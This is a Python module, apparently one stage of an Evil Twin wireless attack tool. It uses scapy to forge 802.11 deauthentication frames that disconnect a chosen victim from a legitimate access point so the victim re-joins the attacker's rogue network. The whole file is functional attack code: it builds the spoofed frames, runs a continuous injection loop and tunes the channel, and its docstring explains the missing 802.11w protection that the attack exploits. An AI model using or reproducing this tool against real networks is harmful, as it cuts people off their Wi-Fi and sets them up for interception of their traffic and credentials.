"""Stage 5 — Targeted Disconnection.

To make the victim leave the legitimate network (so they re-associate with our Evil Twin),
we forge 802.11 *deauthentication* management frames.  Deauth frames are unprotected on
networks without 802.11w (Management Frame Protection), and 802.11 has no way to verify the
sender — so a spoofed deauth claiming to come from the AP is accepted as genuine.  This is
the core protocol weakness the whole attack relies on.

Crucially this is **targeted**: every frame is addressed to the *single victim MAC* paired
with the legitimate BSSID (we send both AP→STA and STA→AP), and we never use the broadcast
address — so the other clients on the real network are not disturbed.

Injection requires a monitor-mode interface tuned to the legitimate AP's channel.
"""

from __future__ import annotations

import threading
import time
from typing import Optional

from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp  # type: ignore

from core import interfaces
from core.state import STATE, Stage, StageStatus

# 802.11 reason code 7 = "Class 3 frame received from nonassociated station" — a common,
# innocuous-looking reason that reliably kicks clients.
REASON_CODE = 7


class DeauthAttacker:
    """Continuously deauthenticates exactly one victim from one BSSID, in a thread."""

    def __init__(
        self,
        iface: str,
        bssid: str,
        victim_mac: str,
        channel: Optional[int] = None,
        burst: int = 64,
        interval: float = 0.20,
    ):
        self.iface = iface
        self.bssid = bssid
        self.victim = victim_mac
        self.channel = channel
        self.burst = burst              # frames sent per cycle
        self.interval = interval        # pause between cycles (seconds)
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._sent = 0

    def _frames(self):
        """Build the two directed deauth frames (AP→victim and victim→AP)."""
        # AP tells the victim it is deauthenticated.
        ap_to_sta = (
            RadioTap()
            / Dot11(addr1=self.victim, addr2=self.bssid, addr3=self.bssid)
            / Dot11Deauth(reason=REASON_CODE)
        )
        # Victim tells the AP it is leaving (covers APs that ignore the first direction).
        sta_to_ap = (
            RadioTap()
            / Dot11(addr1=self.bssid, addr2=self.victim, addr3=self.bssid)
            / Dot11Deauth(reason=REASON_CODE)
        )
        return [ap_to_sta, sta_to_ap]

    def _loop(self) -> None:
        frames = self._frames()
        while not self._stop.is_set():
            try:
                sendp(frames, iface=self.iface, count=self.burst, inter=0.001,
                      verbose=False)
                self._sent += self.burst * len(frames)
            except OSError as exc:
                STATE.log(f"Deauth send error: {exc}", level="error")
                break
            self._stop.wait(self.interval)

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> bool:
        if self._thread and self._thread.is_alive():
            return True
        if self.victim.lower() == "ff:ff:ff:ff:ff:ff":
            STATE.log("Refusing to broadcast-deauth — this stage targets one victim only.",
                      level="error")
            return False

        # Tune the monitor interface to the legitimate AP's channel so frames land.
        if self.channel:
            interfaces.set_channel(self.iface, self.channel)

        self._stop.clear()
        self._sent = 0
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

        STATE.deauth_running = True
        STATE.set_stage(Stage.DEAUTH, StageStatus.RUNNING)
        STATE.log(
            f"Targeted deauth started: victim {self.victim} ↔ BSSID {self.bssid} "
            f"on channel {self.channel}",
            level="warn",
        )
        return True

    def stop(self) -> None:
        self._stop.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2)
        STATE.deauth_running = False
        if STATE.stages.get(Stage.DEAUTH) == StageStatus.RUNNING:
            STATE.set_stage(Stage.DEAUTH, StageStatus.DONE)
        STATE.log(f"Targeted deauth stopped ({self._sent} frames sent).", level="info")

    @property
    def sent(self) -> int:
        return self._sent

    @property
    def running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()
